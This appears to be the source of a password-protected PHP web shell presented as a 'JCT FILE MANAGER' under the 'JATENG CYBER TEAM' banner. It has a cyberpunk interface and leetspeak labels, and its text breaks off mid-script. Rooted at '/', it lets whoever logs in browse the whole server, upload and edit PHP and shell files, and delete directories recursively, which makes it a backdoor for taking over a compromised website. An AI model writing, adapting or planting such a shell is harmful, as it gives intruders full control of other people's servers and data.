<?php
// ════════════════════════════════════════════════════════════
//  FILE MANAGER — PHP 7.* compatible · single file
//  Auth    : session + bcrypt
//  Routing : #path=/xxx
//  Ops     : ls · upload · mkdir · delete · rename · edit
// ════════════════════════════════════════════════════════════

// ── CONFIG ──────────────────────────────────────────────────
define('FM_ROOT',    '/');
define('FM_MAXSIZE', 50 * 1024 * 1024);
// php -r "echo password_hash('password_kamu', PASSWORD_BCRYPT);"
define('FM_HASH',    '$2y$10$CHs78u/yBFvx75JBNo4wcut2GRRgM1UkY89pgKtkMFQEFr4XRYOl.');

define('FM_EXT', [
    'txt','md','log','csv','json','xml','yaml','yml','ini','env',
    'html','htm','css','js','ts','jsx','tsx','vue','php','py','rb',
    'sh','bash','go','rs','java','c','cpp','h','conf',
    'jpg','jpeg','png','gif','webp','svg','ico','bmp',
    'mp4','mp3','pdf','zip','tar','gz','7z','woff','woff2','ttf',
]);

// Ekstensi yang bisa diedit sebagai teks
define('FM_EDITABLE', [
    'txt','md','log','csv','json','xml','yaml','yml','ini','env',
    'html','htm','css','js','ts','jsx','tsx','vue','php','py','rb',
    'sh','bash','go','rs','java','c','cpp','h','hpp','conf',
    'htaccess','gitignore','prettierrc','eslintrc','babelrc',
    'editorconfig','toml','sql','graphql','proto','makefile',
]);

// ── BOOTSTRAP ────────────────────────────────────────────────
session_name('_fm');
session_start(['cookie_httponly'=>true,'cookie_samesite'=>'Strict','use_strict_mode'=>true]);
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: no-referrer');

// ── HELPERS ──────────────────────────────────────────────────
function authed(): bool { return !empty($_SESSION['fm_ok']); }

function csrf_get(): string {
    if (empty($_SESSION['fm_csrf'])) $_SESSION['fm_csrf'] = bin2hex(random_bytes(24));
    return $_SESSION['fm_csrf'];
}
function csrf_check(): bool {
    return !empty($_SESSION['fm_csrf'])
        && hash_equals($_SESSION['fm_csrf'], $_POST['_t'] ?? '');
}

/**
 * @param string $rel
 * @return string|false
 */
function jail(string $rel) {
    $clean = str_replace(['\\', "\0"], ['/', ''], $rel);
    $raw   = (strncmp($clean, '/', 1) === 0) ? $clean : (FM_ROOT . '/' . ltrim($clean, '/'));
    $parts = explode('/', $raw);
    $stack = [];
    foreach ($parts as $p) {
        if ($p === '' || $p === '.') continue;
        if ($p === '..') { if ($stack) array_pop($stack); continue; }
        $stack[] = $p;
    }
    $abs  = '/' . implode('/', $stack);
    $root = rtrim(FM_ROOT, '/');
    if ($root === '') return $abs;
    if ($abs !== $root && strpos($abs, $root . '/') !== 0) return false;
    return $abs;
}

function hsize(int $b): string {
    foreach (['B','KB','MB','GB'] as $u) {
        if ($b < 1024) return round($b, 1) . " $u";
        $b = (int)($b / 1024);
    }
    return $b . ' GB';
}

/**
 * @param array $d
 * @return void
 */
function json_die(array $d) {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($d, JSON_UNESCAPED_UNICODE);
    exit;
}

function safe_name(string $s): string {
    return preg_replace('/[^a-zA-Z0-9._\-]/', '', trim($s));
}

// ════════════════════════════════════════════════════════════
//  AJAX HANDLER
// ════════════════════════════════════════════════════════════
if (!empty($_POST['_ajax'])) {
    if (!authed())     json_die(['ok'=>false,'msg'=>'Belum login']);
    if (!csrf_check()) json_die(['ok'=>false,'msg'=>'CSRF mismatch']);

    $act = $_POST['act'] ?? '';

    // ── LIST ──
    if ($act === 'ls') {
        $abs = jail($_POST['dir'] ?? '/');
        if (!$abs || !is_dir($abs)) json_die(['error'=>'Direct0ry n0t f0und']);
        $items = @scandir($abs);
        if ($items === false) json_die(['error'=>'Cann0t read direct0ry']);
        $dirs = $files = [];
        foreach ($items as $e) {
            if ($e==='.'||$e==='..') continue;
            $p   = $abs.'/'.$e;
            $ext = strtolower(pathinfo($e, PATHINFO_EXTENSION));
            $mt  = date('d/m/y H:i', (int)filemtime($p));
            if (is_dir($p))  $dirs[]  = ['n'=>$e,'m'=>$mt];
            else              $files[] = ['n'=>$e,'s'=>hsize((int)filesize($p)),'m'=>$mt,'ed'=>in_array($ext,FM_EDITABLE,true)];
        }
        usort($dirs,  function($a, $b) { return strcasecmp($a['n'], $b['n']); });
        usort($files, function($a, $b) { return strcasecmp($a['n'], $b['n']); });
        $tree = [];
        foreach ((array)@scandir(FM_ROOT) as $e) {
            if ($e==='.'||$e==='..') continue;
            if (is_dir(FM_ROOT.'/'.$e)) $tree[] = ['n'=>$e,'p'=>'/'.$e];
        }
        usort($tree, function($a, $b) { return strcasecmp($a['n'], $b['n']); });
        json_die(['ok'=>true,'dirs'=>$dirs,'files'=>$files,'tree'=>$tree]);
    }

    // ── MKDIR ──
    if ($act === 'mkdir') {
        $name = safe_name($_POST['name'] ?? '');
        if ($name==='') json_die(['ok'=>false,'msg'=>'Nama tidak valid']);
        $abs  = jail($_POST['dir'] ?? '/');
        if (!$abs||!is_dir($abs)) json_die(['ok'=>false,'msg'=>'Direktori tidak valid']);
        $new  = $abs.'/'.$name;
        if (file_exists($new)) json_die(['ok'=>false,'msg'=>"'{$name}' sudah ada"]);
        if (!mkdir($new,0755)) json_die(['ok'=>false,'msg'=>'Failed to create f0lder']);
        json_die(['ok'=>true,'msg'=>"Folder '{$name}' dibuat"]);
    }

    // ── DELETE ──
    if ($act === 'delete') {
        $abs = jail($_POST['path'] ?? '');
        if (!$abs || $abs===FM_ROOT || !file_exists($abs)) json_die(['ok'=>false,'msg'=>'Target tidak valid']);
        if (is_dir($abs)) {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($abs, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($it as $item) $item->isDir() ? rmdir($item->getRealPath()) : unlink($item->getRealPath());
            rmdir($abs);
            json_die(['ok'=>true,'msg'=>'Folder dihapus']);
        }
        unlink($abs);
        json_die(['ok'=>true,'msg'=>'File dihapus']);
    }

    // ── RENAME ──
    if ($act === 'rename') {
        $abs     = jail($_POST['path'] ?? '');
        $newname = safe_name($_POST['newname'] ?? '');
        if (!$abs || $abs===FM_ROOT || !file_exists($abs)) json_die(['ok'=>false,'msg'=>'Target tidak valid']);
        if ($newname==='') json_die(['ok'=>false,'msg'=>'Nama baru tidak valid']);
        $dest = dirname($abs).'/'.$newname;
        if (file_exists($dest)) json_die(['ok'=>false,'msg'=>"'{$newname}' already available"]);
        if (!rename($abs, $dest)) json_die(['ok'=>false,'msg'=>'Failed to rename']);
        json_die(['ok'=>true,'msg'=>"Diubah menjadi '{$newname}'"]);
    }

    // ── BACA FILE (untuk editor) ──
    if ($act === 'read') {
        $abs = jail($_POST['path'] ?? '');
        if (!$abs || !is_file($abs)) json_die(['ok'=>false,'msg'=>'File not found']);
        $ext = strtolower(pathinfo($abs, PATHINFO_EXTENSION));
        if (!in_array($ext, FM_EDITABLE, true)) json_die(['ok'=>false,'msg'=>'Tipe file tidak bisa diedit']);
        if (filesize($abs) > 2*1024*1024) json_die(['ok'=>false,'msg'=>'File too large to edit (max. 2 MB)']);
        json_die(['ok'=>true,'content'=>file_get_contents($abs),'name'=>basename($abs)]);
    }

    // ── SIMPAN FILE ──
    if ($act === 'save') {
        $abs = jail($_POST['path'] ?? '');
        if (!$abs || !is_file($abs)) json_die(['ok'=>false,'msg'=>'File not found']);
        $ext = strtolower(pathinfo($abs, PATHINFO_EXTENSION));
        if (!in_array($ext, FM_EDITABLE, true)) json_die(['ok'=>false,'msg'=>'Tipe file tidak bisa diedit']);
        if (file_put_contents($abs, $_POST['content'] ?? '') === false)
            json_die(['ok'=>false,'msg'=>'Gagal menyimpan']);
        json_die(['ok'=>true,'msg'=>'File disimpan']);
    }

    // ── UPLOAD ──
    if ($act === 'upload') {
        $abs_dir = jail($_POST['dir'] ?? '/');
        if (!$abs_dir||!is_dir($abs_dir)) json_die(['ok'=>false,'msg'=>'Direktori tidak valid']);
        if (empty($_FILES['file']['name'])) json_die(['ok'=>false,'msg'=>'Tidak ada file']);
        $orig = basename((string)$_FILES['file']['name']);
        $ext  = strtolower(pathinfo($orig, PATHINFO_EXTENSION));
        $err  = (int)$_FILES['file']['error'];
        $tmp  = (string)$_FILES['file']['tmp_name'];
        $sz   = (int)$_FILES['file']['size'];
        if ($err!==UPLOAD_ERR_OK)          json_die(['ok'=>false,'msg'=>"Upload error ($err)"]);
        if (!in_array($ext,FM_EXT,true))   json_die(['ok'=>false,'msg'=>"Ekstensi .{$ext} tidak diizinkan"]);
        if ($sz>FM_MAXSIZE)                json_die(['ok'=>false,'msg'=>'File terlalu besar']);
        if (!is_uploaded_file($tmp))       json_die(['ok'=>false,'msg'=>'Upload tidak sah']);
        $safe = preg_replace('/[^a-zA-Z0-9._\-]/','_',$orig);
        $dest = $abs_dir.'/'.$safe;
        if (file_exists($dest)) $dest = $abs_dir.'/'.bin2hex(random_bytes(4)).'_'.$safe;
        if (move_uploaded_file($tmp,$dest)) json_die(['ok'=>true,'msg'=>"'{$safe}' diupload"]);
        json_die(['ok'=>false,'msg'=>'Failed to save f1le']);
    }

    json_die(['ok'=>false,'msg'=>'Aksi tidak dikenal']);
}

// ════════════════════════════════════════════════════════════
//  LOGIN / LOGOUT
// ════════════════════════════════════════════════════════════
$page_msg = '';
if ($_SERVER['REQUEST_METHOD']==='POST') {
    $act = $_POST['act'] ?? '';
    if ($act==='login') {
        if (password_verify((string)($_POST['pw']??''), FM_HASH)) {
            session_regenerate_id(true);
            $_SESSION['fm_ok'] = true;
            header('Location: '.$_SERVER['PHP_SELF']); exit;
        }
        $page_msg = 'Password salah.';
    } elseif ($act==='logout' && authed()) {
        $_SESSION = []; session_destroy();
        header('Location: '.$_SERVER['PHP_SELF']); exit;
    }
}

$CSRF    = csrf_get();
$AUTHED  = authed();
$DEFDIR  = realpath(__DIR__);
?><!doctype html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>JATENG CYBER TEAM - File Manager</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@600;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
/* ── CYBERPUNK RED GLASSMORPHISM THEME ───────────────────────── */
:root {
  --bg-dark: #07080a;
  --surf: rgba(12, 14, 20, 0.20);
  --surf2: rgba(20, 24, 33, 0.30);
  --bdr: rgba(255, 46, 76, 0.35);
  --bdr-hover: rgba(255, 46, 76, 0.8);
  --bdr2: rgba(255, 255, 255, 0.08);
  --hov: rgba(255, 46, 76, 0.16);
  --acc: #ff2e4c;
  --acc-glow: rgba(255, 46, 76, 0.45);
  --acclo: rgba(255, 46, 76, 0.15);
  --ok: #2ea043;
  --err: #ff3344;
  --fg: #f0f6fc;
  --fg2: #a0a8b6;
  --fg3: #58606e;
  --mono: 'JetBrains Mono', monospace;
  --sans: 'Inter', system-ui, sans-serif;
  --cyber: 'Orbitron', sans-serif;
  --r: 8px;
  --sb: 240px;
  color-scheme: dark;
}

*, *::before, *::after {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

/* ── RESPONSIVE BACKGROUND ──────────────────────────────────── */
html, body {
  height: 100%;
  width: 100%;
  color: var(--fg);
  font-family: var(--sans);
  font-size: 14px;
  line-height: 1.5;
  overflow: hidden;
  background-color: var(--bg-dark);
  background-image: url('https://i.ibb.co.com/JFKP49hP/1791363124433.jpg');
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  background-attachment: fixed;
}

@media (max-width: 768px) {
  html, body {
    background-image: url('https://i.ibb.co.com/spQpsntD/1791363230623.jpg');
  }
}

button, input, textarea { font: inherit; }
button { cursor: pointer; border: none; background: none; }
a { color: var(--acc); text-decoration: none; }

/* ── GLASSMORPHISM & BLUR ────────────────────────────────────── */
#sidebar, .topbar, .login-card, .modal, .ftable {
  background: var(--surf);
  backdrop-filter: blur(1px);
  -webkit-backdrop-filter: blur(1px);
  border: 1px solid var(--bdr);
  box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.6);
}

/* ── TOMBOL & KONTROL ──────────────────────────────────────── */
.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  padding: 7px 14px;
  border-radius: var(--r);
  font-size: 12.5px;
  font-weight: 500;
  border: 1px solid var(--bdr);
  background: var(--surf2);
  color: var(--fg);
  transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
  white-space: nowrap;
}
.btn:hover {
  background: var(--hov);
  border-color: var(--acc);
  box-shadow: 0 0 12px var(--acc-glow);
  color: #fff;
}
.btn-primary {
  background: var(--acc);
  color: #fff;
  border-color: var(--acc);
  font-weight: 600;
  box-shadow: 0 0 10px var(--acclo);
}
.btn-primary:hover {
  background: #ff4763;
  box-shadow: 0 0 18px var(--acc-glow);
}
.btn-danger { color: var(--err); }
.btn-danger:hover {
  background: var(--err);
  color: #fff;
  border-color: var(--err);
  box-shadow: 0 0 12px rgba(255, 51, 68, 0.5);
}
.btn-sm { padding: 4px 10px; font-size: 12px; }
.btn-icon {
  padding: 6px;
  border-radius: var(--r);
  border: 1px solid transparent;
  min-width: 30px;
  min-height: 30px;
  color: var(--fg2);
}
.btn-icon:hover {
  background: var(--hov);
  border-color: var(--bdr);
  color: var(--acc);
}
.btn-ghost { border-color: transparent; background: transparent; }
.btn-ghost:hover { background: var(--hov); border-color: var(--bdr); }

/* ── FORM ───────────────────────────────────────────────────── */
.field { display: flex; flex-direction: column; gap: 6px; margin-bottom: 16px; }
.field label {
  font-family: var(--mono);
  font-size: 11px;
  font-weight: 600;
  color: var(--acc);
  letter-spacing: 0.08em;
  text-transform: uppercase;
}
.field input, .field textarea {
  background: rgba(8, 10, 14, 0.7);
  border: 1px solid var(--bdr2);
  border-radius: var(--r);
  padding: 9px 12px;
  color: var(--fg);
  outline: none;
  font-family: var(--sans);
  transition: all 0.2s ease;
}
.field input:focus, .field textarea:focus {
  border-color: var(--acc);
  box-shadow: 0 0 12px var(--acclo);
}

/* ── LOGIN ──────────────────────────────────────────────────── */
.login-wrap {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
  background: rgba(0, 0, 0, 0.25);
}
.login-card {
  border-radius: 12px;
  padding: 38px 32px;
  width: 100%;
  max-width: 380px;
  position: relative;
  overflow: hidden;
}
.login-card::before {
  content: '';
  position: absolute;
  top: 0; left: 0; right: 0;
  height: 3px;
  background: linear-gradient(90deg, transparent, var(--acc), transparent);
}
.login-card h1 {
  font-family: var(--cyber);
  font-size: 18px;
  letter-spacing: 0.05em;
  color: var(--acc);
  margin-bottom: 6px;
  text-shadow: 0 0 10px var(--acc-glow);
}
.login-card p { font-size: 12.5px; color: var(--fg2); margin-bottom: 24px; }
.alert { padding: 10px 14px; border-radius: var(--r); font-size: 13px; border: 1px solid; margin-top: 14px; }
.alert-err { background: rgba(255, 51, 68, 0.15); border-color: var(--err); color: var(--err); }

/* ── SHELL & LAYOUT ─────────────────────────────────────────── */
#shell { display: flex; height: 100vh; overflow: hidden; position: relative; }

/* ── SIDEBAR ────────────────────────────────────────────────── */
#sidebar {
  width: var(--sb);
  min-width: var(--sb);
  display: flex;
  flex-direction: column;
  transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
  z-index: 30;
  border-top: none;
  border-bottom: none;
  border-left: none;
}
.sb-head {
  padding: 14px 16px;
  border-bottom: 1px solid var(--bdr2);
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.sb-logo {
  font-family: var(--cyber);
  font-size: 15px;
  font-weight: 800;
  color: var(--acc);
  letter-spacing: 0.1em;
  text-shadow: 0 0 10px var(--acc-glow);
}
.sb-actions { display: flex; gap: 4px; }
.sb-tree { flex: 1; overflow-y: auto; padding: 10px 0; }
.tree-item {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 7px 16px;
  font-size: 12.5px;
  color: var(--fg2);
  cursor: pointer;
  border-left: 2px solid transparent;
  transition: all 0.15s ease;
  user-select: none;
}
.tree-item:hover { background: var(--hov); color: var(--fg); }
.tree-item.active {
  background: var(--acclo);
  color: var(--acc);
  border-left-color: var(--acc);
  font-weight: 600;
}
.tree-item span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

#sb-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.7);
  backdrop-filter: blur(4px);
  z-index: 29;
}
#sb-overlay.show { display: block; }

/* ── MAIN CONTENT ────────────────────────────────────────────── */
#main { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }

.topbar {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 16px;
  border-top: none;
  border-left: none;
  border-right: none;
  flex-shrink: 0;
}
#hamburger { display: none; }
.breadcrumb {
  display: flex;
  align-items: center;
  gap: 4px;
  flex: 1;
  min-width: 0;
  font-family: var(--mono);
  font-size: 12px;
  color: var(--fg2);
  flex-wrap: wrap;
  overflow: hidden;
}
.crumb {
  color: var(--fg);
  cursor: pointer;
  padding: 3px 6px;
  border-radius: 4px;
  white-space: nowrap;
  transition: background 0.15s, color 0.15s;
}
.crumb:hover { color: var(--acc); background: var(--acclo); }
.sep { color: var(--acc); flex-shrink: 0; opacity: 0.6; }
.tb-actions { display: flex; gap: 8px; flex-shrink: 0; }

#content { flex: 1; overflow-y: auto; padding: 16px; }

/* ── FILE TABLE ─────────────────────────────────────────────── */
.ftable {
  width: 100%;
  border-radius: var(--r);
  overflow: hidden;
  border-collapse: separate;
  border-spacing: 0;
}
.ftable th {
  background: rgba(18, 22, 30, 0.85);
  padding: 10px 14px;
  font-family: var(--mono);
  font-size: 11px;
  font-weight: 600;
  color: var(--acc);
  letter-spacing: 0.08em;
  text-transform: uppercase;
  text-align: left;
  border-bottom: 1px solid var(--bdr);
}
.ftable td {
  padding: 9px 14px;
  border-bottom: 1px solid var(--bdr2);
  vertical-align: middle;
  transition: background 0.15s;
}
.ftable tr:last-child td { border-bottom: none; }
.ftable tbody tr:hover td { background: var(--hov); }

.col-size { width: 90px; }
.col-date { width: 130px; }
.col-act { width: 100px; }

.td-name {
  display: flex;
  align-items: center;
  gap: 10px;
  font-family: var(--mono);
  font-size: 12.5px;
  min-width: 0;
}
.td-name.clickable { cursor: pointer; }
.td-name.clickable:hover .name-label { color: var(--acc); text-shadow: 0 0 8px var(--acclo); }
.name-icon { flex-shrink: 0; color: var(--fg2); display: flex; }
.name-icon.dir { color: var(--acc); }
.name-label { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
.td-meta { font-size: 12px; color: var(--fg2); white-space: nowrap; font-family: var(--mono); }
.td-act { white-space: nowrap; }
.row-actions { display: flex; gap: 4px; justify-content: flex-end; opacity: 0; transition: opacity 0.15s; }
.ftable tbody tr:hover .row-actions { opacity: 1; }
.empty-row td { padding: 48px; text-align: center; color: var(--fg2); font-size: 13px; font-family: var(--mono); }

@media (hover: none) { .row-actions { opacity: 1; } }

/* ── MODALS ─────────────────────────────────────────────────── */
.overlay {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.75);
  backdrop-filter: blur(6px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 50;
  padding: 16px;
}
.overlay[hidden] { display: none !important; }
.modal {
  border-radius: 12px;
  padding: 24px;
  width: 100%;
  max-width: 440px;
  position: relative;
}
.modal h2 {
  font-family: var(--cyber);
  font-size: 15px;
  letter-spacing: 0.05em;
  color: var(--acc);
  margin-bottom: 18px;
}
.modal-foot { display: flex; gap: 10px; justify-content: flex-end; margin-top: 20px; }

.modal-editor { max-width: 900px; width: 100%; display: flex; flex-direction: column; }
.editor-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; gap: 12px; }
.editor-head h2 { font-size: 15px; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin: 0; }
#edit-textarea {
  flex: 1;
  resize: none;
  width: 100%;
  min-height: 440px;
  background: rgba(5, 7, 10, 0.85);
  border: 1px solid var(--bdr);
  border-radius: var(--r);
  padding: 14px;
  color: #81a1c1;
  font-family: var(--mono);
  font-size: 13px;
  line-height: 1.6;
  outline: none;
  tab-size: 2;
}
#edit-textarea:focus { border-color: var(--acc); box-shadow: 0 0 15px var(--acclo); }
.editor-status { font-family: var(--mono); font-size: 11px; color: var(--fg2); margin-top: 10px; }

#drop-zone {
  border: 2px dashed var(--bdr);
  border-radius: var(--r);
  padding: 28px 16px;
  text-align: center;
  color: var(--fg2);
  font-size: 13px;
  cursor: pointer;
  transition: all 0.2s ease;
  margin-bottom: 12px;
  background: rgba(0, 0, 0, 0.2);
}
#drop-zone.over, #drop-zone:hover {
  border-color: var(--acc);
  background: var(--acclo);
  color: #fff;
  box-shadow: 0 0 15px var(--acclo);
}
#file-pick { display: none; }
#file-names { font-family: var(--mono); font-size: 11px; color: var(--acc); min-height: 16px; word-break: break-all; }

/* ── TOASTS ─────────────────────────────────────────────────── */
#toasts {
  position: fixed;
  bottom: 20px;
  right: 20px;
  display: flex;
  flex-direction: column;
  gap: 8px;
  z-index: 200;
  pointer-events: none;
}
.toast {
  padding: 10px 18px;
  border-radius: var(--r);
  font-family: var(--mono);
  font-size: 12.5px;
  border: 1px solid;
  pointer-events: all;
  max-width: 340px;
  backdrop-filter: blur(10px);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
  animation: tin 0.22s cubic-bezier(0.16, 1, 0.3, 1);
}
.toast-ok { background: rgba(46, 160, 67, 0.2); border-color: var(--ok); color: #56d364; }
.toast-err { background: rgba(255, 51, 68, 0.2); border-color: var(--err); color: #ff6b7a; }
@keyframes tin { from { opacity: 0; transform: translateY(10px) scale(0.96); } to { opacity: 1; transform: none; } }

/* ── SCROLLBAR ──────────────────────────────────────────────── */
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: rgba(255, 46, 76, 0.25); border-radius: 4px; }
::-webkit-scrollbar-thumb:hover { background: var(--acc); }

/* ── MEDIA QUERIES ──────────────────────────────────────────── */
@media (max-width: 900px) {
  :root { --sb: 200px; }
  .col-date { display: none; }
  .col-act { width: 85px; }
}

@media (max-width: 640px) {
  #sidebar {
    position: fixed;
    top: 0; left: 0; bottom: 0;
    transform: translateX(-100%);
    box-shadow: 10px 0 30px rgba(0, 0, 0, 0.8);
  }
  #sidebar.open { transform: translateX(0); }
  #hamburger { display: flex; }
  .col-size, .col-date { display: none; }
  .col-act { width: 75px; }
  .crumb { max-width: 100px; }
  #content { padding: 10px; }
  .topbar { padding: 10px; gap: 6px; }
  .tb-actions .btn-text { display: none; }
  .modal { padding: 20px; }
  #edit-textarea { min-height: 60vh; }
}
</style>
</head>
<body>

<?php if (!$AUTHED): ?>
<!-- ══ LOGIN ══════════════════════════════════════════════════ -->
<div class="login-wrap">
  <div class="login-card">
    <h1>/ JCT FILE MANAGER</h1>
    <p>Please authenticate to manage server files.</p>
    <form method="post" autocomplete="off">
      <input type="hidden" name="act" value="login">
      <div class="field">
        <label>PASSWORD SYSTEM</label>
        <input type="password" name="pw" autofocus required placeholder="••••••••">
      </div>
      <button type="submit" class="btn btn-primary" style="width:100%; padding: 10px;">AUTH</button>
    </form>
    <?php if ($page_msg): ?>
      <div class="alert alert-err"><?= htmlspecialchars($page_msg) ?></div>
    <?php endif ?>
  </div>
</div>

<?php else: ?>
<!-- ══ APP ════════════════════════════════════════════════════ -->
<div id="sb-overlay"></div>

<div id="shell">
  <nav id="sidebar">
    <div class="sb-head">
      <span class="sb-logo">JCT::FM</span>
      <div class="sb-actions">
        <button class="btn-icon btn-ghost" id="sb-close" style="display:none" title="Tutup">✕</button>
      </div>
    </div>
    <div class="sb-tree" id="tree"></div>
  </nav>

  <div id="main">
    <div class="topbar">
      <button class="btn btn-icon btn-ghost" id="hamburger" title="Menu" aria-label="Buka sidebar">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
      </button>
      <div class="breadcrumb" id="breadcrumb"></div>
      <div class="tb-actions">
        <button class="btn btn-sm btn-ghost" id="btn-mkdir">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
          <span class="btn-text">F0lder</span>
        </button>
        <button class="btn btn-sm btn-primary" id="btn-upload">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0018 9h-1.26A8 8 0 103 16.3"/></svg>
          <span class="btn-text">Upl0ad</span>
        </button>
        <form method="post" style="display:inline;margin:0">
          <input type="hidden" name="act" value="logout">
          <button type="submit" class="btn btn-sm btn-ghost btn-danger">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
            <span class="btn-text">L0g0ut</span>
          </button>
        </form>
      </div>
    </div>

    <div id="content">
      <table class="ftable" id="ftable">
        <thead>
          <tr>
            <th>NAME FILE / DIR</th>
            <th class="col-size td-meta">SIZE</th>
            <th class="col-date td-meta">DATE</th>
            <th class="col-act"></th>
          </tr>
        </thead>
        <tbody id="fbody">
          <tr class="empty-row"><td colspan="4">JCT - Load data...</td></tr>
        </tbody>
      </table>
    </div>
  </div>
</div>

<!-- ══ MODAL: Buat Folder ═════════════════════════════════════ -->
<div class="overlay" id="m-mkdir" hidden>
  <div class="modal">
    <h2>[+] CREATE NEW F0LDER</h2>
    <div class="field">
      <label>F0lder Name</label>
      <input type="text" id="mkdir-name" placeholder="name-f0lder" autocomplete="off">
    </div>
    <div class="modal-foot">
      <button class="btn" onclick="closeAll()">Cancel</button>
      <button class="btn btn-primary" id="mkdir-ok">Create</button>
    </div>
  </div>
</div>

<!-- ══ MODAL: Upload ══════════════════════════════════════════ -->
<div class="overlay" id="m-upload" hidden>
  <div class="modal">
    <h2>[^] UPL0AD FILE</h2>
    <div id="drop-zone">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="display:block;margin:0 auto 10px; color:var(--acc);"><path d="M4 17v2a2 2 0 002 2h12a2 2 0 002-2v-2M16 6l-4-4-4 4M12 2v13"/></svg>
      Drop File here or <strong style="color:var(--acc)">click for select</strong>
      <input type="file" id="file-pick" multiple>
    </div>
    <div id="file-names"></div>
    <div class="modal-foot">
      <button class="btn" onclick="closeAll()">Cancel</button>
      <button class="btn btn-primary" id="upload-ok">Upl0ad</button>
    </div>
  </div>
</div>

<!-- ══ MODAL: Rename ══════════════════════════════════════════ -->
<div class="overlay" id="m-rename" hidden>
  <div class="modal">
    <h2>[*] RENAME</h2>
    <div class="field">
      <label>New Name</label>
      <input type="text" id="rename-input" autocomplete="off">
    </div>
    <div class="modal-foot">
      <button class="btn" onclick="closeAll()">Cancel</button>
      <button class="btn btn-primary" id="rename-ok">Save</button>
    </div>
  </div>
</div>

<!-- ══ MODAL: Edit File ═══════════════════════════════════════ -->
<div class="overlay" id="m-edit" hidden style="align-items:flex-start;padding-top:max(24px,4vh)">
  <div class="modal modal-editor">
    <div class="editor-head">
      <h2 id="edit-title">[/] EDIT F1LE</h2>
      <div style="display:flex;gap:8px;flex-shrink:0">
        <button class="btn btn-sm" id="edit-cancel">Cl0se</button>
        <button class="btn btn-sm btn-primary" id="edit-save">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21H5a2 2 0 01-2-2V5a2 2 0 012-2h11l5 5v11a2 2 0 01-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
          Save (Ctrl+S)
        </button>
      </div>
    </div>
    <textarea id="edit-textarea" spellcheck="false"></textarea>
    <div class="editor-status" id="edit-status"></div>
  </div>
</div>

<!-- ══ MODAL: Hapus ═══════════════════════════════════════════ -->
<div class="overlay" id="m-delete" hidden>
  <div class="modal">
    <h2 style="color:var(--err)">[!] Confirm Deletion</h2>
    <p id="del-label" style="color:var(--fg);font-size:13px;margin-bottom:8px;word-break:break-all;font-family:var(--mono)"></p>
    <p style="color:var(--err);font-size:12px">This action is permanent and cannot be undone.</p>
    <div class="modal-foot">
      <button class="btn" onclick="closeAll()">Cancel</button>
      <button class="btn btn-danger" id="del-ok">Delete</button>
    </div>
  </div>
</div>

<div id="toasts"></div>

<script>
// ── KONSTAN PHP → JS ────────────────────────────────────────
const T            = <?= json_encode($CSRF) ?>;
const URL          = <?= json_encode($_SERVER['PHP_SELF']) ?>;
const DEFAULT_PATH = <?= json_encode($DEFDIR) ?>;

// ── SIDEBAR (Mobile Drawer) ──────────────────────────────────
const sidebar   = document.getElementById('sidebar');
const sbOverlay = document.getElementById('sb-overlay');
const sbClose   = document.getElementById('sb-close');
const hamburger = document.getElementById('hamburger');

function openSidebar(){
  sidebar.classList.add('open');
  sbOverlay.classList.add('show');
  sbClose.style.display='flex';
}
function closeSidebar(){
  sidebar.classList.remove('open');
  sbOverlay.classList.remove('show');
